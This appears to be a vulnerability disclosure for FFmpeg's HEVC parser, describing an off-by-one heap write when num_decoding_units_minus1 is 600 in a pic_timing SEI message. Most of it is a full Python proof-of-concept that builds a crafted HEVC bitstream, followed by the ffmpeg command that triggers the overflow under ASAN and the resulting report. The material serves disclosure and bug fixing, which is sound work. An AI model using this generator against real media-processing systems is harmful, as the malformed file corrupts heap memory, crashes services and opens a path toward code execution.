## Bug0: Off-by-One OOB Heap Write in HEVC CBS sei_pic_timing via num_decoding_units_minus1

### Summary

In `cbs_h265_syntax_template.c`, the function `cbs_h265_read_sei_pic_timing()` reads `num_decoding_units_minus1` with an upper bound of `HEVC_MAX_SLICE_SEGMENTS` (600). The subsequent loop `for (i = 0; i <= current->num_decoding_units_minus1; i++)` iterates up to i=600 and writes `num_nalus_in_du_minus1[i]`, but `H265RawSEIPicTiming.num_nalus_in_du_minus1` is declared with exactly 600 elements (valid indices 0–599). When an attacker sets `num_decoding_units_minus1=600`, the write at index 600 is one element past the end of the heap-allocated array, corrupting adjacent heap memory.

### PoC

A Python script generates a minimal HEVC Annex-B bitstream (VPS + SPS with sub-picture HRD timing parameters + PPS + Prefix SEI containing a `pic_timing` message with `num_decoding_units_minus1=600` + IDR slice), saved as `poc_input.h265`, which is then passed to `ffmpeg` via the `trace_headers` bitstream filter to trigger CBS parsing and the out-of-bounds write.

```python
#!/usr/bin/env python3
"""
PoC: Off-by-One OOB Heap Write in HEVC CBS sei_pic_timing
Generates poc_input.h265 — a minimal HEVC Annex-B bitstream that triggers
a heap-buffer-overflow in cbs_h265_read_sei_pic_timing() at index 600.
"""

import struct
import os


class BitWriter:
    def __init__(self):
        self._bits = []

    def write_bits(self, value, n):
        for i in range(n - 1, -1, -1):
            self._bits.append((value >> i) & 1)

    def write_ue(self, value):
        if value == 0:
            self._bits.append(1)
            return
        v = value + 1
        nbits = v.bit_length()
        for _ in range(nbits - 1):
            self._bits.append(0)
        self._bits.append(1)
        for i in range(nbits - 2, -1, -1):
            self._bits.append((v >> i) & 1)

    def write_se(self, value):
        self.write_ue(2 * value - 1 if value > 0 else -2 * value)

    def write_flag(self, value):
        self._bits.append(1 if value else 0)

    def write_rbsp_trailing_bits(self):
        self._bits.append(1)
        while len(self._bits) % 8 != 0:
            self._bits.append(0)

    def to_bytes(self):
        bits = list(self._bits)
        while len(bits) % 8 != 0:
            bits.append(0)
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)


def apply_emulation_prevention(data: bytes) -> bytes:
    result = bytearray()
    zero_count = 0
    for byte in data:
        if zero_count >= 2 and byte <= 0x03:
            result.append(0x03)
            zero_count = 0
        zero_count = (zero_count + 1) if byte == 0x00 else 0
        result.append(byte)
    return bytes(result)


def make_annex_b(rbsp_with_header: bytes) -> bytes:
    return b'\x00\x00\x00\x01' + apply_emulation_prevention(rbsp_with_header)


def write_profile_tier_level(bw, profile_present_flag, max_sub_layers_minus1):
    if profile_present_flag:
        bw.write_bits(0, 2)   # general_profile_space
        bw.write_flag(0)      # general_tier_flag
        bw.write_bits(1, 5)   # general_profile_idc = 1 (Main)
        for j in range(32):
            bw.write_flag(1 if j == 1 else 0)
        bw.write_flag(1); bw.write_flag(0); bw.write_flag(0); bw.write_flag(1)
        bw.write_bits(0, 43)  # general_reserved_zero_43bits
        bw.write_flag(0)      # general_inbld_flag
    bw.write_bits(93, 8)      # general_level_idc


def write_sub_layer_hrd(bw, sub_pic_present, cpb_cnt_minus1):
    for i in range(cpb_cnt_minus1 + 1):
        bw.write_ue(0); bw.write_ue(0)
        if sub_pic_present:
            bw.write_ue(0); bw.write_ue(0)
        bw.write_flag(0)


def write_hrd_parameters(bw, common_inf_present, max_sub_layers_minus1):
    if common_inf_present:
        bw.write_flag(1)  # nal_hrd_parameters_present_flag
        bw.write_flag(0)  # vcl_hrd_parameters_present_flag
        bw.write_flag(1)  # sub_pic_hrd_params_present_flag
        bw.write_bits(0, 8)   # tick_divisor_minus2
        bw.write_bits(0, 5)   # du_cpb_removal_delay_increment_length_minus1
        bw.write_flag(1)      # sub_pic_cpb_params_in_pic_timing_sei_flag
        bw.write_bits(0, 5)   # dpb_output_delay_du_length_minus1
        bw.write_bits(0, 4)   # bit_rate_scale
        bw.write_bits(0, 4)   # cpb_size_scale
        bw.write_bits(0, 4)   # cpb_size_du_scale
        bw.write_bits(0, 5)   # initial_cpb_removal_delay_length_minus1
        bw.write_bits(0, 5)   # au_cpb_removal_delay_length_minus1
        bw.write_bits(0, 5)   # dpb_output_delay_length_minus1
    for i in range(max_sub_layers_minus1 + 1):
        bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
        bw.write_ue(0)  # cpb_cnt_minus1
        write_sub_layer_hrd(bw, 1, 0)


def build_vps() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1); bw.write_bits(32, 6); bw.write_bits(0, 6); bw.write_bits(1, 3)
    bw.write_bits(0, 4); bw.write_flag(1); bw.write_flag(1)
    bw.write_bits(0, 6); bw.write_bits(0, 3); bw.write_flag(1)
    bw.write_bits(0xFFFF, 16)
    write_profile_tier_level(bw, 1, 0)
    bw.write_flag(0); bw.write_ue(1); bw.write_ue(0); bw.write_ue(0)
    bw.write_bits(0, 6); bw.write_ue(0)
    bw.write_flag(0); bw.write_flag(0)
    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


def build_sps() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1); bw.write_bits(33, 6); bw.write_bits(0, 6); bw.write_bits(1, 3)
    bw.write_bits(0, 4); bw.write_bits(0, 3); bw.write_flag(1)
    write_profile_tier_level(bw, 1, 0)
    bw.write_ue(0)   # sps_seq_parameter_set_id
    bw.write_ue(1)   # chroma_format_idc = 1
    bw.write_ue(64)  # pic_width
    bw.write_ue(64)  # pic_height
    bw.write_flag(0) # conformance_window_flag
    bw.write_ue(0); bw.write_ue(0)  # bit_depth_luma/chroma_minus8
    bw.write_ue(0)   # log2_max_pic_order_cnt_lsb_minus4
    bw.write_flag(0)
    bw.write_ue(1); bw.write_ue(0); bw.write_ue(0)
    bw.write_ue(1); bw.write_ue(2)  # log2_min_cb_minus3, log2_diff_max_min_cb
    bw.write_ue(0); bw.write_ue(0)  # log2_min_tb_minus2, log2_diff_max_min_tb
    bw.write_ue(0); bw.write_ue(0)  # max_transform_hierarchy depth inter/intra
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_ue(0)   # num_short_term_ref_pic_sets
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(1)  # vui_parameters_present_flag
    # VUI
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(1)  # vui_timing_info_present_flag
    bw.write_bits(1, 32); bw.write_bits(25, 32)
    bw.write_flag(0)  # vui_poc_proportional_to_timing_flag
    bw.write_flag(1)  # vui_hrd_parameters_present_flag
    write_hrd_parameters(bw, 1, 0)
    bw.write_flag(0)  # bitstream_restriction_flag
    bw.write_flag(0)  # sps_extension_present_flag
    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


def build_pps() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1); bw.write_bits(34, 6); bw.write_bits(0, 6); bw.write_bits(1, 3)
    bw.write_ue(0); bw.write_ue(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_bits(0, 3)
    bw.write_flag(0); bw.write_flag(0)
    bw.write_ue(0); bw.write_ue(0)
    bw.write_se(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_se(0); bw.write_se(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_ue(0)
    bw.write_flag(0); bw.write_flag(0)
    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


def build_sei_pic_timing_payload() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1)  # au_cpb_removal_delay_minus1 (1 bit)
    bw.write_bits(0, 1)  # pic_dpb_output_delay (1 bit)
    bw.write_bits(0, 1)  # pic_dpb_output_du_delay (1 bit)
    bw.write_ue(600)     # num_decoding_units_minus1 = 600 → OOB at index 600
    bw.write_flag(1)     # du_common_cpb_removal_delay_flag
    bw.write_bits(0, 1)  # du_common_cpb_removal_delay_increment_minus1
    for i in range(601):
        bw.write_ue(0)   # num_nalus_in_du_minus1[i]; index 600 is OOB
    return bw.to_bytes()


def build_prefix_sei() -> bytes:
    bw_hdr = BitWriter()
    bw_hdr.write_bits(0, 1); bw_hdr.write_bits(39, 6)
    bw_hdr.write_bits(0, 6); bw_hdr.write_bits(1, 3)
    bw_hdr.write_bits(1, 8)   # payloadType = 1 (pic_timing)
    payload = build_sei_pic_timing_payload()
    remaining = len(payload)
    while remaining >= 255:
        bw_hdr.write_bits(0xFF, 8); remaining -= 255
    bw_hdr.write_bits(remaining, 8)
    assert len(bw_hdr._bits) % 8 == 0
    rbsp = bw_hdr.to_bytes() + payload + b'\x80'
    return rbsp


def build_idr_slice() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1); bw.write_bits(19, 6); bw.write_bits(0, 6); bw.write_bits(1, 3)
    bw.write_flag(1)  # first_slice_segment_in_pic_flag
    bw.write_flag(0)  # no_output_of_prior_pics_flag
    bw.write_ue(0)    # slice_pic_parameter_set_id
    bw.write_ue(2)    # slice_type = I
    bw.write_se(0)    # slice_qp_delta
    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


def main():
    out_file = 'poc_input.h265'
    bitstream = (
        make_annex_b(build_vps()) +
        make_annex_b(build_sps()) +
        make_annex_b(build_pps()) +
        make_annex_b(build_prefix_sei()) +
        make_annex_b(build_idr_slice())
    )
    with open(out_file, 'wb') as f:
        f.write(bitstream)
    print(f"[+] Generated {out_file} ({len(bitstream)} bytes)")
    print(f"[+] num_decoding_units_minus1=600 triggers OOB write at num_nalus_in_du_minus1[600]")


if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/ffmpeg -i poc_input.h265 -c:v copy -bsf:v trace_headers -f null -
cat asan.log.*
```

### Result

Running with ASAN enabled triggers a UBSan/ASAN report: `runtime error: index 600 out of bounds for type 'uint16_t [600]'` in `cbs_h265_read_sei_pic_timing` at `cbs_h265_syntax_template.c:2005`, with the call stack `ff_cbs_read_packet() → cbs_h265_read_nal_unit() → cbs_h265_read_sei() → ff_cbs_sei_read_message() → cbs_h265_read_sei_pic_timing()`. The `H265RawSEIPicTiming` struct is heap-allocated, so the one-element out-of-bounds write corrupts the adjacent `du_cpb_removal_delay_increment_minus1[0]` field with an attacker-controlled value, resulting in heap memory corruption that can cause process crash (DoS) or, with further exploitation, arbitrary code execution.
